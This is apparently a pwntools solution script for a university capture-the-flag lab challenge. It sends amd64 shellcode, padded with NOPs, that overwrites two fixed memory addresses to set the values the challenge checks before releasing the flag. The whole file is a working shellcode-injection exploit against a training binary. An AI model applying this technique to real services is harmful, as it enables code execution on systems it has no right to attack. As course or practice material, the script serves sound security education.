from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

bin = ELF('./assembly')

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1294)
p.sendline(b"vc2499")

sec_addr = 0x404090   
data_addr = 0x404098   
secret = 0x1badb002     
data_404098 = 0xdead10cc   

p.recvuntil(b'Set the right secrets to get the flag!\n')


shell = asm(f'''
    mov rax, {secret}      # Load target for secrets
    mov [{sec_addr}], rax   # Set 'secrets' to target
    mov rax, {data_404098}     # Load target for data_404098
    mov [{data_addr}], rax  # Set 'data_404098' to target
''')

payload = shell.ljust(0x50, b"\x90")

p.send(payload)
p.interactive()

